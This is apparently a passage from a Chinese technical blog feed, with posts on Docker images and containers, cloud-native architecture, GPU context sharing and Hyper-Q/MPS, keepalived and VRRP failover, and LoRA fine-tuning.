翻译一下：<br><br> &nbsp;&nbsp;  容器镜像是一个轻量级、独立、可执行软件的打包，这个包内包含了需要运行该软件的代码、运行环境、系统工具、系统库、配置。基于Linux和Windows的应用，容器化后的软件可以运行在windows或者Linux，无需感知环境的变化。容器将软件与其他不想关的资源隔离，例如不区分开发环境、演示环境，减少不同团队在相同基础环境运行不同软件带来的冲突<br>##容器与镜像</li>
</ol>
<p>参考下面最经典的docker技术架构图。 <br><br><img src="/2020/09/08/%E8%B0%88Docker%E5%AE%B9%E5%99%A8/docker.png" alt="BP"></p>
<p>###按照这幅图上的3个命令梳理一下</p>
<ol>
<li><p>docker build<br>如前文所说，docker只是把容器管理以命令行的方式呈现，docker对容器生态最大的贡献是他的镜像（Image）<br><br>容器镜像可以认为一个应用+运行环境的模板，和虚拟机模板类似，但是与虚拟机模板不同的是：这个镜像一般比较小，通常只是包含应用的执行文件以及特定的运行环境，不会包含操作系统的文件，制作镜像是需要定义一个描述镜像内容的描述文件就OK了，docker里面叫做dockerfile，不会像虚拟机模板那样，需要在虚拟化环境上进行一次操作系统安装，<br><br>镜像是平台无关的，平台无关就是制作了一次镜像，可以运行在windows、linux、阿里云、Vmware、华为云等等，不像虚拟机，你在阿里云上制作的虚拟机模板只能在阿里云使用，在AWS上制作的虚拟机模板只能在AWS使用。容器镜像的平台无关性是容器发展迅速的重要原因，这个特性解放了应用开发商与服务开发商，也让平台提供商有了新的发展方向。<br><br>回到这条命令上来，通常我们执行docker build 是需要编写dockerfile文件，如下所示，是制作大数据Ambari Server镜像的dockerfile文件</p>
<p><img src="/2020/09/08/%E8%B0%88Docker%E5%AE%B9%E5%99%A8/dockerfile.png" alt="avatar"></p>
<p><br>当定义了这个dockerfile后，在命令行执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">   docker build . -t ambari-server:1.0</span><br><span class="line">&#96;&#96;&#96;&#96;  </span><br><span class="line">&amp;nbsp;&amp;nbsp; 就可以获取到我们制作的容器镜像了，制作完成后，只是放在了本地机器上了，需要执行一个命令</span><br></pre></td></tr></table></figure>
<p>docker push  ambari-server:1.0 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">将镜像保存到镜像仓库（registry），这样其他主机才能使用到该镜像</span><br><span class="line"></span><br><span class="line">  2. docker pull</span><br><span class="line">    </span><br><span class="line">   这个命令就是在主机上将容器镜像从镜像仓库下载下来，实现了镜像的远程获取、分发能力。这个镜像下载并不是全量下载，而是只是把该主机上缺少的镜像下载下来，这里就涉及到容器镜像的分层特性，这里就不展开说了。</span><br><span class="line">     </span><br><span class="line">  3. docker run：</span><br><span class="line"></span><br><span class="line">那么容器是如何从镜像变为容器呢，我们只需要执行docker run 命令</span><br></pre></td></tr></table></figure>
<p>docker run -itd  ambari-server:1.0  bash</p>
<pre><code>执行这个命令后，
1、docker 会在宿主机上分配一个目录，将镜像的文件挂载到这个目录2  &lt;br /&gt;
2、docker会在docker Daemon进程上fork出一个子进程，这个子进程是命名空间隔离的，你在容器内看不到宿主机的信息  &lt;br /&gt;
3、docker会为这个容器分配IP地址  &lt;br /&gt;
</code></pre>
</li>
</ol>
<p>登录到这个容器后，你看到的进程信息和网络信息如下<br> <img src="/2020/09/08/%E8%B0%88Docker%E5%AE%B9%E5%99%A8/net1.png" alt="avatar"></p>
<p><img src="/2020/09/08/%E8%B0%88Docker%E5%AE%B9%E5%99%A8/net2.png" alt="avatar"></p>
<p>##容器与应用</p>
<p>   虚拟机强调资源的分配的管理，而容器更强调对应用的管理，随着容器的出现，容器逐渐开始影响软件架构。与虚拟机相比，容器有哪些优势？可以看下表的对比分析<br>    上表的对比一般都是各个容器厂商的宣传卖点，容器为应用真正带来了哪些？或者说应用的哪些需求推动了容器的普及？<br>###应用部署<br>   容器为应用部署带来的变化主要体现在开发环境、测试环境、生产环境的一致性上，依赖于docker的镜像，在应用开发完成后，架构师就可以定义应用的镜像，这个镜像里面包含了应用的运行环境（Tomcat、JDK、Nginx等），也包含了应用的可执行文件（War文件、Jar文件等），将之前需要在项目现场做的工作交由最熟悉的架构师完成，交付人员在项目现场只需要执行一个简单的docker run命令就可以了。<br>###应用迁移<br>   将应用部署在虚拟机时，应用迁移一般有两种方式<br>   a.将应用所在的虚拟机以虚拟机模板的方式导出，如果是跨云的话，还需要做虚拟机模板的格式转化，将虚拟机模板再导入到另一个云环境,然后再去修改各种参数配置<br>   <br>b.虚拟机模板格式无法转化（例如从AWS迁移到阿里云），这时只能重新部署了。<br>      如果你使用容器转载你的应用，既不会存在这样的问题了，容器镜像与容器技术属于平台无关性，只要把镜像复制过去，然后启动容器就OK了。<br>###应用升级：<br>  应用升级对于复杂的系统是个很棘手的事情，升级前需要做备份，升级失败要做恢复，有了容器就简单多了，停掉旧版本的容器，启动新版本的容器，升级失败，只需要停掉新版本容器，启动旧版本容器就可以了。<br>       在IT领域，最重要的就是应用，或者说一个新的名词-SAAS，无论云计算、大数据还是机器学习，这些其实都是为应用提供支撑，让应用更好的运维、让应用更好的呈现数据价值、让应用能够进化到自我学习等。云计算的PAAS，其实就是为应用提供多种支撑的，只是由于多种因素，PAAS一直不温不火。。直到容器的出现，容器是为应用而生，更进一步说，容器是云时代的应用载体。</p>
<p>，</p>
]]></content>
  </entry>
  <entry>
    <title>编译tensorflow 源码</title>
    <url>/2020/12/15/%E7%BC%96%E8%AF%91tensorflow-%E6%BA%90%E7%A0%81/</url>
    <content><![CDATA[<p><a href="https://www.cnblogs.com/dzzy/p/13493876.html" target="_blank" rel="noopener">https://www.cnblogs.com/dzzy/p/13493876.html</a></p>
<p><a href="http://fancyerii.github.io/2020/11/14/centos-build-tf/" target="_blank" rel="noopener">http://fancyerii.github.io/2020/11/14/centos-build-tf/</a></p>
]]></content>
      <tags>
        <tag>tensorflow</tag>
      </tags>
  </entry>
  <entry>
    <title>谈云计算与云原生</title>
    <url>/2020/12/05/%E8%B0%88%E4%BA%91%E8%AE%A1%E7%AE%97%E4%B8%8E%E4%BA%91%E5%8E%9F%E7%94%9F/</url>
    <content><![CDATA[<h2 id="云计算中的IAAS-PAAS-SAAS"><a href="#云计算中的IAAS-PAAS-SAAS" class="headerlink" title="云计算中的IAAS/PAAS/SAAS"></a>云计算中的IAAS/PAAS/SAAS</h2><p>云计算的概念提出者是IBM，但是IBM并没有很好的落地的产品，对于在线图书商店AWS，却有可以落地的场景，买了大量服务器，但是在图书销售淡季，造成了资源的浪费，因此逐渐有了目前云计算的领导者AWS，对于云计算相关工作者来说，我们<br>对AWS最深的印象时公有云NO.1，尝尝会忽略人家盈利最多的在线商城。</p>
<p>云计算刚提出的时候是提出了三个层次，即IAAS、PAAS、SAAS，这三个层次我们可以认为是云计算能力不同范围的概括，如下图所示：</p>
<p><img src="/2020/12/05/%E8%B0%88%E4%BA%91%E8%AE%A1%E7%AE%97%E4%B8%8E%E4%BA%91%E5%8E%9F%E7%94%9F/cloud1.png" alt="avatar"></p>
<a id="more"></a>
<p>但实际上这代表了云计算发展的三个阶段，更直白的说就是PAAS的发展需要在IAAS发展成熟的基础上，SAAS的发展需要在PAAS发展成熟的基础上，不可能并行发展，也不可能跳跃发展。当然对于细分领域的PAAS平台肯定就没有这个限制了，我这里主要还是指的通用的云平台，以公有云厂商的能力为准。</p>
<ol>
<li><p>IAAS的发展阶段，主要包括这样的内容</p>
<p> 1.1.各大厂商争相模仿AWS、自研底层虚拟化平台，比提供兼容AWS的接口，此时都以AWS作为需求开发的标准</p>
<p> 1.2.底层虚拟化软件除了商业版的Vmware，出现了越来越多的开源的虚拟化软件，例如XEN、KVM、libvirt等，定位与私有云平台厂商的产品开始基于这些虚拟化软件做二次开发</p>
<p> 1.3.出现了越来越多的不同厂家的云管理平台，以及开源的云平台，OpenStack/CloudStack/Zstack等，随后各个厂家开始基于OpenStack作为标准进行自家云平台的二次开发或深度定制，此时越来越多的云厂家基于利旧（充分发挥老旧服务器的作用）、平台不绑定、资源异构（计算资源异构、存储资源异构、网络资源异构）的标准进行产品定位和宣传</p>
<p> 1.4IAAS尝试提出为了解决资源利用率与降低成本，自动化运维进行市场宣传，传统厂商开始逐渐接受云的能力，并逐渐将自己业务迁移到公有云平台或者私有云平台</p>
<p> 1.6.此时，市场对PAAS的认可度不高，我觉得市场度认可不够的原因有两个，一个是技术成熟度，有基于虚拟机做的PAAS，但是不是很好用，另一方面，云厂商对这方面的市场宣传不多，大家还都是主要发力于底层IAAS建设</p>
</li>
<li><p>PAAS发展的阶段，包含这样的内容</p>
<p> 2.1 以虚拟机为代表的PAAS平台，自动编排虚拟机+应用+服务，这个其实我们在OpenStack的发展过程中就能看到，从只包含nova、neutron、cinder组件，到现在各种基于虚拟机的编排heat、sahara等，开始基于虚拟机的编排，来做服务的自动化创建，但是这种PAAS 很笨重，侧重于服务的自动化创建，距离应用的自动化管理有不少差距</p>
<p> 2.2以容器为代表的PAAS平台，这里的开源项目有docker、CloudFoundry+warden、Kubernetes，我做的第一个PAAS项目其实是基于CLoudFoundry+warden，这是有Privotal公司开源的业界第一个容器的PAAS平台，在当时来说还是非常先进的，但是受限于CloudFoundry中并没有像docker中镜像的概念来持久化打包应用，他里面是有一个叫buildpack的东西，需要对不同的开发语言版本、运行环境制作不同的buildpack，还是很麻烦的，跨平台迁移也比较费劲。现在最火的就是Kubernetes+docker和围绕他们的技术栈</p>
<p> 2.3.PAAS的定位也越来越清晰，以应用为中心，为应用的自动化运维提供支撑，例如应用需要的服务（数据库、缓存、消息队列）、运维管理（监控告警、弹性伸缩）等</p>
<p> 2.4.平台+生态，更多的服务能够集成到生态，传统厂商也希望基于云平台厂商的能力，来拿到更多的客户，逐渐兴起了平台+生态的概念，希望大的平台厂商能够给传统厂商带来客户</p>
<p> 2.5 随着iaas的成熟，这些年在不同的行业出现了不同的paas平台，不同的细分行业的技术平台积累，也都开始叫做XX PAAS云平台</p>
</li>
<li><p>SAAS的发展阶段，SAAS更多是属于应用的范围，需要应用来支持多租户，从而可以实现一个产品来支持多个客户，通常多租户有两种方案，一种是多实例部署，即不同的客户，我给你部署一个实例，还有一种方案是基于应用改造，即应用通过分库分表，在自己的业务层进行多租户的区分。这里云平台厂商目前提供的能力有限</p>
</li>
</ol>
<p><img src="/2020/12/05/%E8%B0%88%E4%BA%91%E8%AE%A1%E7%AE%97%E4%B8%8E%E4%BA%91%E5%8E%9F%E7%94%9F/cloud2.png" alt="avatar"></p>
<h2 id="云原生"><a href="#云原生" class="headerlink" title="云原生"></a>云原生</h2><p>好多概念我们可以发现都是来自于互联网，我们先说一下传统应用与互联网应用的区别，</p>
<ol>
<li><p>对于传统应用通常具有以下特征,需求比较固定，是个项目，完成以后就是运维，用户访问量可以预测，较为固定，用户访问的并发量比较低，非在线业务，允许一定时间的业务停顿，此时的开发方式通常是瀑布式，当软件开发完成时，可能就交给运维部门了，然后就是会有些打补丁的工作，项目组开发人员也可能解散了。</p>
</li>
<li><p>但是对于互联网应用，需求是持续发展的，是一个产品，持续发展，版本特性不断累加和变化，用户访问量难以预测，用户访问的并发量是万级、十万、百万，属于在线业务，业务不能停顿，互联网应用需要24小时保持稳定可靠。对于该类应用的开发人员通常会一直围绕这个产品进行开发，需要一直对这个产品的功能、稳定性进行负责并持续优化。这里对技术就提出了更高的要求，你需要支持敏捷开发、弹性伸缩，强大的监控能力，支持海量并发，灰度发布等等。</p>
</li>
</ol>
<h3 id="传统应用的典型架构"><a href="#传统应用的典型架构" class="headerlink" title="传统应用的典型架构"></a>传统应用的典型架构</h3><p><img src="/2020/12/05/%E8%B0%88%E4%BA%91%E8%AE%A1%E7%AE%97%E4%B8%8E%E4%BA%91%E5%8E%9F%E7%94%9F/cloud3.png" alt="avatar"></p>
<p>上图是一个常见的包含三层应用的架构，通常对于传统应用都会包含多个模块，每个模块都实现了一些功能，模块之间是紧耦合在一起的，通过对象的调用(函数级API的调用)，功能调用紧密的结合在一起。这种高耦合性最典型的表现就是，哪怕开发者改了一行代码，整个应用都要重新编译部署；应用有可能是有状态的，例如通常会在程序内存中保存一些业务数据或者在应用使用的本地存储持久化一些信息，还有例如spring中的有状态bean和无状态bean（有状态bena保存了会话信息）由于这种高耦合性以及有状态，对于提供应用服务的挑战在于，要保证应用服务的持续运行。在生产环境中，一般都是要实施HA的解决方案的，比如App的集群，数据库的HA等等，同时为了保证服务宕机的时候，要能够快速恢复服务。因此，数据库会进行定期的备份。</p>
<p>我们在开发传统应用时，通常会有这样的场景，在开发环境中可以运行的应用，在生产环境中会出现很多问题，因为基本上开发者是没有精力去维护一个复杂的高可用的和生产环境一样的开发环境。而对于运维人员，他们的任务是什么，不管是物理机还是虚机，都要全力保证物理机和虚机的运行。一旦物理机或虚机发生故障，对服务的影响也是灾难性的，往往需要一个手动恢复服务的过程。在开发人员和运维人员之间有一个gap。开发人员和运维人员不太喜欢进行产品的功能变更，带来的工作量很大。这里总结一下传统应用架构的问题，我觉得可以归为三类：故障运维、应用伸缩、需求变更</p>
<h3 id="云原生应用的典型架构"><a href="#云原生应用的典型架构" class="headerlink" title="云原生应用的典型架构"></a>云原生应用的典型架构</h3><p><img src="/2020/12/05/%E8%B0%88%E4%BA%91%E8%AE%A1%E7%AE%97%E4%B8%8E%E4%BA%91%E5%8E%9F%E7%94%9F/cloud4.png" alt="avatar"></p>
<p>你可能不太懂云原生，但是我们在做架构设计的时候，可能已经潜意识的去这样做了，因为现在这个DevOps、微服务、容器太火了，不管IT的什么行业，我觉得都应该听过这几个名词。我们看到图中，角色并没有太大变化，仍然是有web，app，和db。这里要说明的一点，传统应用也许是部署在物理服务器或者虚拟化平台上，但是云原生应用一定是部署在云平台上的主要的变化包括：</p>
<p> 第一，应用被拆分成了几个小的应用，紧耦合变为松耦合；由模块变成线程级的微服务；</p>
<p> 第二，应用由有状态变为无状态的。大家也许会问，在业务逻辑中总是会有状态产生的，应该怎么办呢？这里重要的是对状态的一个管理，就是把状态保存在有状态服务中去。这些有状态服务包括缓存，比如memcache，数据库，比如mysql，mongodb，文件系统，消息对了等等。这些有状态服务以资源的形式提供给应用。这些资源在应用部署的时候，是以显性的依赖来声明的</p>
<p>第三，通过container技术，打包/隔离运行环境；在虚机和应用之间增加一层来隔离，在不同执行环境之间提供最大化的可移植性</p>
<p>对于传统应用，我们可以发现云原生应用的几个特点：微服务、无状态、弹性伸缩、DevOps</p>
<p>找到一张阿里云给云原生定义的图，如下，可以看出，云原生架构 可以理解为在进行软件架构设计时，就基于云平台的能力去设计，例如DevOps、微服务、容器，能够充分发挥云平态对应用的运维管理能力，即非业务功能交给云平台去处理。</p>
<p><img src="/2020/12/05/%E8%B0%88%E4%BA%91%E8%AE%A1%E7%AE%97%E4%B8%8E%E4%BA%91%E5%8E%9F%E7%94%9F/cloud5.png" alt="avatar"></p>
<p>云原生定义的几个阶段</p>
<p><img src="/2020/12/05/%E8%B0%88%E4%BA%91%E8%AE%A1%E7%AE%97%E4%B8%8E%E4%BA%91%E5%8E%9F%E7%94%9F/cloud6.png" alt="avatar"></p>
<h3 id="云原生十二要素"><a href="#云原生十二要素" class="headerlink" title="云原生十二要素"></a>云原生十二要素</h3><p>这里有一个云原生的十二要素，这个其实是最开始对云原生定义时，使用，虽然云原生的定义已经变化多次，但是这个十二要素可以作为我们进行软件设计的参考</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. 基准代码：一份基准代码，多份部署。基准代码和应用之间总是保持一一对应的关系。所有部署的基准代码相同，但每份部署可以使用其不同的版本。</span><br><span class="line">2. 依赖：显式声明依赖关系。应用程序一定通过依赖清单 ，确切地声明所有依赖项。</span><br><span class="line">3. 配置：在环境中存储配置。将应用的配置存储于环境变量中。环境变量可以非常方便地在不同的部署间做修改，却不动一行代码。</span><br><span class="line">4. 后端服务：把后端服务当作附加资源。应用不会区别对待本地或第三方服务。对应用程序而言，两种都是附加资源。</span><br><span class="line">5. 构建，发布，运行：严格区分构建，发布，运行这三个步骤。</span><br><span class="line">6. 进程：以一个或多个无状态进程运行应用。应用的进程必须无状态且无共享。</span><br><span class="line">7. 端口绑定：通过端口绑定提供服务。应用完全自我加载而不依赖于任何网络服务器就可以创建一个面向网络的服务。</span><br><span class="line">8. 并发：通过进程模型进行扩展。开发人员可以运用这个模型去设计应用架构，将不同的工作分配给不同的进程类型。</span><br><span class="line">9. 易处理：快速启动和优雅终止可最大化健壮性。应用的进程是可支配的，意思是说它们可以瞬间开启或停止。</span><br><span class="line">10. 开发环境与线上环境等价：尽可能保持开发、预发布、线上环境相同。应用想要做到持续部署就必须缩小本地与线上差异。</span><br><span class="line">11. 日志：把日志当作事件流。应用本身考虑存储自己的输出流。不应该试图去写或者管理日志文件。</span><br><span class="line">12. 管理进程：后台管理任务当作一次性进程运行。一次性管理进程应该和正常的常驻进程使用同样的环境。</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>云计算  云原生</tag>
      </tags>
  </entry>
  <entry>
    <title>GPU中的Hyper-Q技术</title>
    <url>/2020/12/10/GPU%E4%B8%AD%E7%9A%84Hyper-Q%E6%8A%80%E6%9C%AF/</url>
    <content><![CDATA[<h2 id="GPU-抢占"><a href="#GPU-抢占" class="headerlink" title="GPU 抢占"></a>GPU 抢占</h2><p>由于 GPU 核数较多, 抢占 GPU 需要保存大量的上下文信息, 开销较大, 所以目前市场上 GPU 都不支持抢占特性. 只用当前任务完成之后, GPU 才能被下个应用程序使用。 在 GPU 虚拟化的环境中, 多用户使用的场景会导致 GPU 进行频繁的任务切换, 可抢占的 GPU 能够防止恶意用户长期占用, 并且 能够实现用户优先级权限管理。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A CUDA context is a virtual execution space that holds the code and data owned by a host thread or process. Only one context can ever be active on a GPU with all current hardware.</span><br><span class="line"></span><br><span class="line">So to answer your first question, if you have seven separate threads or processes all trying to establish a context and run on the same GPU simultaneously, they will be serialised and any process waiting for access to the GPU will be blocked until the owner of the running context yields. There is, to the best of my knowledge, no time slicing and the scheduling heuristics are not documented and (I would suspect) not uniform from operating system to operating system.</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">You would be better to launch a single worker thread holding a GPU context and use messaging from the other threads to push work onto the GPU. Alternatively there is a context migration facility available in the CUDA driver API, but that will only work with threads from the same process, and the migration mechanism has latency and host CPU overhead.</span><br></pre></td></tr></table></figure>

<p>翻译一下：</p>
<p>尝试建立context并且同时运行在同一GPU设备上的不同的线程或进程，它们会被串行化而且任何等待访问GPU的进程将会被阻塞直到运行的context的进程退出。并没有文档来介绍时间分片还有调度算法。建议最好先启动包含着GPU上下文的单 worker 线程，使用来自别的线程的消息来将工作推给GPU。或者，CUDA driver API有个上下文迁移工具，它也能与来自同一进程的线程配合，但是迁移机制有延迟，对CPU带来负荷。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CUDA activity from independent host processes will normally create independent CUDA contexts, one for each process. Thus, the CUDA activity launched from separate host processes will take place in separate CUDA contexts, on the same device.</span><br><span class="line"></span><br><span class="line">CUDA activity in separate contexts will be serialized. The GPU will execute the activity from one process, and when that activity is idle, it can and will context-switch to another context to complete the CUDA activity launched from the other process. The detailed inter-context scheduling behavior is not specified. (Running multiple contexts on a single GPU also cannot normally violate basic GPU limits, such as memory availability for device allocations.)</span><br><span class="line"></span><br><span class="line">The &quot;exception&quot; to this case (serialization of GPU activity from independent host processes) would be the CUDA Multi-Process Server. In a nutshell, the MPS acts as a &quot;funnel&quot; to collect CUDA activity emanating from several host processes, and run that activity as if it emanated from a single host process. The principal benefit is to avoid the serialization of kernels which might otherwise be able to run concurrently. The canonical use-case would be for launching multiple MPI ranks that all intend to use a single GPU resource.</span><br><span class="line"> </span><br><span class="line">Note that the above description applies to GPUs which are in the &quot;Default&quot; compute mode. GPUs in &quot;Exclusive Process&quot; or &quot;Exclusive Thread&quot; compute modes will reject any attempts to create more than one process&#x2F;context on a single device. In one of these modes, attempts by other processes to use a device already in use will result in a CUDA API reported failure. The compute mode is modifiable in some cases using the nvidia-smi utility.</span><br></pre></td></tr></table></figure>


<h2 id="Hyper-Q-技术"><a href="#Hyper-Q-技术" class="headerlink" title="Hyper-Q 技术"></a>Hyper-Q 技术</h2><p>为了解决多个Kernel 函数同时在GPU中运行的问题，Nvidia 推出了Hyper-Q这个硬件技术，具体可以参考下面的ppt。目前实行多进程同时运行在GPU的方法是基于NVIDIA的MPS技术</p>
<object data="./20191031_MPS_davidwu.pdf" type="application/pdf" width="100%" height="877px"></object>]]></content>
  </entry>
  <entry>
    <title>keepalived技术原理</title>
    <url>/2023/03/02/keepalived%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/</url>
    <content><![CDATA[<h2 id="keepalived本质作用"><a href="#keepalived本质作用" class="headerlink" title="keepalived本质作用"></a>keepalived本质作用</h2><p>  <img src="/2023/03/02/keepalived%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/2.png" alt="avatar"></p>
<p>Keepalived的体系结构从整体上分为两层，分别是用户空间层（User Space）和内核空间层（Kernel Space）</p>
<p>内核空间层： 处于最底层，它包括IPVS和NETLINK两个模块。</p>
<ol>
<li>IPVS模块是Keepalived引入的一个第三方模块，通过IPVS可以实现基于IP的负载均衡集群， 在Keepalived中，IPVS模块是可配置的，如果需要负载均衡功能，可以在编译Keepalived时打开负载均衡功能，反正，也可以通过配置编译参数关闭。Keepalived借助于第三方模块IPVS就可以很方便地搭建一套负载均衡系统，解决了ipvs不具备的高可用和健康状态检测的功能。是vrrp协议在Linux主机上以守护进程方式的实现，能够根据配置文件自动生成ipvs规则，能够对RS做健康状态检测；</li>
<li>NETLINK模块主要用于实现一些高级路由框架和一些相关的网络功能，完成用户空间层Netlink Reflector模块发来的各种网络请求</li>
</ol>
<p>用户空间<br>   在用户空间层，Keepalived又分为四个部分，分别是Scheduler I/O Multiplexer、Memory Management、Control Plane和Core components。其中，Scheduler I/O Multiplexer是一个I/O复用分发调度器，它负责安排Keepalived所有内部的任务请求。Memory Management是一个内存管理机制，这个框架提供了访问内存的一些通用方法。Control Plane是Keepalived的控制面板，可以实现对配置文件进行编译和解析，Keepalived的配置文件解析比较特殊，它并不是一次解析所有模块的配置，而是只有在用到某模块时才解析相应的配置</p>
<p>其中各个组件的功能介绍参考如下所示：</p>
<p>  <font size="6">WatchDog </font>：WatchDog是计算机可靠性领域中一个极为简单又非常有效的检测工具，它的工作原理是针对被监视的目标设置一个计数器和一个阈值，WatchDog会自己增加此计数值，然后等待被监视的目标周期性地重置该计数值。一旦被监控目标发生错误，就无法重置此计数值，WatchDog就会检测到，于是就采取对应的恢复措施，例如重启或关闭。在Linux中很早就引入了WatchDog功能，而Keepalived正是通过WatchDog的运行机制来监控Checkers和VRRP进程的。</p>
<p>  <font size="6">Checkers</font>：Keepalived最基础的功能，也是最主要的功能，可实现对服务器运行状态检测和故障隔离。</p>
<p>  <font size="6">VRRP Stack</font>： Keepalived后来引入的VRRP功能，可以实现HA集群中失败切换（Failover）功能。Keepalived通过VRRP功能再结合LVS负载均衡软件即可部署一套高性能的负载均衡集群系统。</p>
<p>  <font size="6">IPVS wrapper</font>： IPVS功能的一个实现。IPVS wrapper模块可以将设置好的IPVS规则发送到内核空间并提交给IPVS模块，最终实现IPVS模块的负载均衡功能。</p>
<p>  <font size="6">Netlink Reflector</font>： 用来实现高可用集群中Failover时虚拟IP（VIP）的设置和切换。Netlink Reflector的所有请求最后都发送到内核空间的NETLINK模块来完成。</p>
<h2 id="VRRP协议与工作原理"><a href="#VRRP协议与工作原理" class="headerlink" title="VRRP协议与工作原理"></a>VRRP协议与工作原理</h2><p>在现实的网络环境中。主机之间的通信都是通过配置静态路由或者(默认网关)来完成的，而主机之间的路由器一旦发生故障，通信就会失效，因此这种通信模式当中，路由器就成了一个单点瓶颈，为了解决这个问题，就引入了VRRP协议。VRRP协议是一种容错的主备模式的协议，保证当主机的下一跳路由出现故障时，由另一台路由器来代替出现故障的路由器进行工作，通过VRRP可以在网络发生故障时透明的进行设备切换而不影响主机之间的数据通信。</p>
<h3 id="虚拟路由器"><a href="#虚拟路由器" class="headerlink" title="虚拟路由器"></a>虚拟路由器</h3><p>  虚拟路由器是VRRP备份组中所有路由器的集合，它是一个逻辑概念，并不是正真存在的。从备份组外面看备份组中的路由器，感觉组中的所有路由器就像一个一样，可以理解为在一个组中： 主路由器+所有备份路由器=虚拟路由器。虚拟路由器有一个虚拟的IP地址和MAC地址。主机将虚拟路由器当作默认网关。虚拟MAC地址的格式为00-00-5E-00-01-{VRID}。通常情况下，虚拟路由器回应ARP请求使用的是虚拟MAC地址，只有虚拟路由器做特殊配置的时候，才回应接口的真实MAC地址。<br>  <img src="/2023/03/02/keepalived%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/1.png" alt="avatar"></p>
<h3 id="主路由器（MASTER）："><a href="#主路由器（MASTER）：" class="headerlink" title="主路由器（MASTER）："></a>主路由器（MASTER）：</h3><p>   虚拟路由器通过虚拟IP对外提供服务，而在虚拟路由器内部同一时间只有一台物理路由器对外提供服务，这台提供服务的物理路由器被称为主路由器。一般情况下Master是由选举算法产生，它拥有对外服务的虚拟IP，提供各种网络功能，如：ARP请求，ICMP数据转发等。</p>
<p>  &emsp;&emsp; 备份路由器（BACKUP）：虚拟路由器中的其他物理路由器不拥有对外的虚拟IP，也不对外提供网络功能，仅接受MASTER的VRRP状态通告信息，这些路由器被称为备份路由器。当主路由器失败时，处于BACKUP角色的备份路由器将重新进行选举，产生一个新的主路由器进入MASTER角色，继续提供对外服务，整个切换对用户来说是完全透明的。</p>
<h2 id="解决VIP从一个master迁移到另一个另一个backup的问题"><a href="#解决VIP从一个master迁移到另一个另一个backup的问题" class="headerlink" title="解决VIP从一个master迁移到另一个另一个backup的问题"></a>解决VIP从一个master迁移到另一个另一个backup的问题</h2><h3 id="问题描述："><a href="#问题描述：" class="headerlink" title="问题描述："></a>问题描述：</h3><p>  当VIP在master点时，此时局域网内的客户端存储的是VIP所在的master的MAC地址，而当master宕机，VIP迁移到backup节点时，局域网内的客户端保留的VIP所对应的MAC地址依然是master的MAC地址，这时局域网内的客户端向外发送信息时还是会去找master<br>方法一arp欺骗：<br>        &emsp;&emsp;每一主机在局域网中都会自动不断接收网络中的各种广播信息，尤其是arp的解析广播信息，并且收到一个arp解析广播信息后，主机都会与自己的arp缓存做比对。例如一个主机在局域网内广播1.1.1.1对应的MAC地址是多少，1.1.1.1这个主机收到广播后就会广播响应，此时在同一局域网内的其他主机也可以收到主机1.1.1.1的回应，其他主机就会把1.1.1.1的回应广播与自己arp缓存进行对比，如果MAC不一致，这个主机就做修改。鉴于此方法，任何时刻当VIP从一个主机迁移到另一个主机时，那么转移到的主机(A)就来一个自问自答的arp广播，即主机(比如是A)会广播问：A主机IP对应的MAC地址是什么，这时A再回答具体是什么，那么在同一个局域网中的其他主机听到这个arp广播后就会自动更新A的IP所对应的MAC地址<br>方法二 VMAC:<br>        &emsp;&emsp; virtual MAC是使用物理MAC，最终还要结合arp欺骗</p>
<h3 id="VRRP-工作过程"><a href="#VRRP-工作过程" class="headerlink" title="VRRP 工作过程"></a>VRRP 工作过程</h3><p>&emsp;&emsp; (1) 虚拟路由器中的路由器根据优先级选举出Master。Master路由器通过发送欺骗ARP报文，将自己的虚拟MAC地址通知给与它连接的设备或者主机，从而承担报文转发任务；(假如路由器的优先级一样，就根据主机的IP地址大小进行选择，IP地址大的是master)<br>&emsp;&emsp;(2)Master路由器周期性发送VRRP报文，以公布其配置信息（优先级等）和工作状况；<br>&emsp;&emsp;(3)如果Master路由器出现故障，虚拟路由器中的Backup路由器将根据优先级重新选举新的Master；因为可能会有多个Backup路由器。<br>&emsp;&emsp;(4)虚拟路由器状态切换时，Master路由器由一台设备切换为另外一台设备，新的Master路由器只是简单地发送一个携带虚拟路由器的MAC地址和虚拟IP地址信息的欺骗ARP报文，这样就可以更新与它连接的主机或设备中的ARP相关信息。网络中的主机感知不到Master路由器已经切换为另外一台设备。<br>&emsp;&emsp;(5)Backup路由器的优先级高于Master路由器时，由Backup路由器的工作方式（抢占方式和非抢占方式）决定是否重新选举Master。</p>
<p>由此可见，为了保证Master路由器和Backup路由器能够协调工作，VRRP需要实现以下功能：<br>a. Master路由器的选举；<br>b. Master路由器状态的通告；<br>c. 同时，为了提高安全性，VRRP还提供了认证功能；</p>
]]></content>
  </entry>
  <entry>
    <title>大模型微调技术</title>
    <url>/2023/10/09/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%BE%AE%E8%B0%83%E6%8A%80%E6%9C%AF/</url>
    <content><![CDATA[<h2 id="LORA-低秩自适应"><a href="#LORA-低秩自适应" class="headerlink" title="LORA(低秩自适应)"></a>LORA(低秩自适应)</h2><p>LoRA 允许我们通过优化适应过程中密集层变化的秩分解矩阵，来间接训练神经网络中的一些密集层，同时保持预先训练的权重不变。<br>LoRA 的思想很简单:<br>  在原始 PLM (Pre-trained Language Model) 旁边增加一个旁路，做一个降维再升维的操作，来模拟所谓的intrinsic rank。训练的时候固定 PLM 的参数，只训练降维矩阵A 与升维矩阵B 。而模型的输入输出维度不变，输出时将BA与 PLM 的参数叠加。矩阵A用随机高斯分布初始化 ，矩阵B用 0 矩阵初始化 ，保证训练的开始此旁路矩阵依然是 0 矩阵。<br><img src="/2023/10/09/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%BE%AE%E8%B0%83%E6%8A%80%E6%9C%AF/1.png" alt="avatar"></p>
<p>优势：</p>
<ol>
<li>参数量较全参数微调（Fine-Tuning）显著降低，参数量和现有高效参数微调方法持平或更低。</li>
<li>性能优于其它参数高效微调方法，和全参数微调（Fine-Tuning）基本持平甚至更高。</li>
</ol>
